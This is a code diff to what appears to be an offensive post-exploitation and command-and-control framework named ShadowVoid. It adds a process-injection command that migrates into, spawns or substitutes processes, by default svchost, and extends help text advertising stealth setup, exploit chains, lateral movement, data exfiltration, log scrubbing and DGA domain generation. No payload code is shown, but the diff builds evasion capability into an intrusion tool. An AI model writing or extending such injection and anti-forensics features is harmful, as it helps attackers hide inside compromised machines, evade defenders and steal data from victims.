@@ -82,7 +82,8 @@ CONFIG = {
         'net': {'enabled': True, 'path': 'modules.net'},
         'web': {'enabled': True, 'path': 'modules.web'},
         'onion': {'enabled': True, 'path': 'modules.onion'},
-        'post_exploit': {'enabled': True, 'path': 'modules.post_exploit'}
+        'post_exploit': {'enabled': True, 'path': 'modules.post_exploit'},
+        'process_injection': {'enabled': True, 'path': 'modules.process_injection'}
     },
     'exfiltration': {
         'compression': 'zstd',
@@ -872,6 +873,8 @@ class ShadowVoidCore:
             return self.cmd_pivot(args)
         elif cmd == 'exfil':
             return self.cmd_exfil(args)
+        elif cmd == 'inject':
+            return self.cmd_inject(args)
         elif cmd == 'clean':
             return self.cmd_clean(args)
         elif cmd == 'modules':
@@ -925,6 +928,31 @@ class ShadowVoidCore:
             return post_instance.lateral_movement('current', target, method)
         return {'status': 'error', 'message': 'Post-exploit module not available'}
 
+    def cmd_inject(self, args):
+        if not args:
+            return {'status': 'error', 'message': 'Command required (migrate/spawn/list/cleanup)'}
+        subcmd = args[0].lower()
+        inject_module = MODULES.get('process_injection')
+        if not inject_module:
+            return {'status': 'error', 'message': 'Process injection module not available'}
+        injector = inject_module.ProcessInjector(self)
+        if subcmd == 'migrate':
+            target = args[1] if len(args) > 1 else 'svchost'
+            return injector.migrate_to_process(target)
+        elif subcmd == 'spawn':
+            target = args[1] if len(args) > 1 else 'svchost'
+            return injector.spawn_and_inject(target)
+        elif subcmd == 'list':
+            processes = injector.list_injectable_processes()
+            return {'status': 'success', 'processes': processes}
+        elif subcmd == 'cleanup':
+            return injector.cleanup()
+        elif subcmd == 'substitute':
+            target = args[1] if len(args) > 1 else 'svchost'
+            return injector.substitute_process(target)
+        else:
+            return {'status': 'error', 'message': f'Unknown inject command: {subcmd}'}
+
     def cmd_exfil(self, args):
         if len(args) < 2:
             return {'status': 'error', 'message': 'Source and destination required'}
@@ -973,7 +1001,7 @@ class ShadowVoidCore:
         return {'status': 'error', 'message': 'Invalid C2 command'}
 
     def cmd_help(self, args):
-        help_text = "ShadowVoid Framework - Memory-Resident Offensive Security Orchestrator\n\nCOMMANDS:\n  init                    Initialize stealth environment\n  scan <target> [type]   Run reconnaissance\n  exploit <cve> [target] Execute exploit chain\n  pivot <target> [method] Establish lateral movement\n  exfil <source> <dest> [channel] Start data exfiltration\n  clean                  Scrub logs and artifacts\n  modules list           List loaded modules\n  c2 status              Show C2 status\n  c2 generate [count]    Generate DGA domains\n  help                   Show this help\n  exit                   End session and exit"
+        help_text = "ShadowVoid Framework - Memory-Resident Offensive Security Orchestrator\n\nCOMMANDS:\n  init                    Initialize stealth environment\n  scan <target> [type]   Run reconnaissance\n  exploit <cve> [target] Execute exploit chain\n  pivot <target> [method] Establish lateral movement\n  inject <cmd> [args]    Process injection (migrate/spawn/list/substitute/cleanup)\n  exfil <source> <dest> [channel] Start data exfiltration\n  clean                  Scrub logs and artifacts\n  modules list           List loaded modules\n  c2 status              Show C2 status\n  c2 generate [count]    Generate DGA domains\n  help                   Show this help\n  exit                   End session and exit"
         return {'status': 'success', 'help': help_text}
 
     def cmd_exit(self, args):
@@ -1009,6 +1037,8 @@ def main():
                         command = 'pivot'
                     elif quick_cmd == 'exfil':
                         command = 'exfil'
+                    elif quick_cmd == 'inject':
+                        command = 'inject'
                     elif quick_cmd == 'clean':
                         command = 'clean'
                 result = core.execute_command(command)
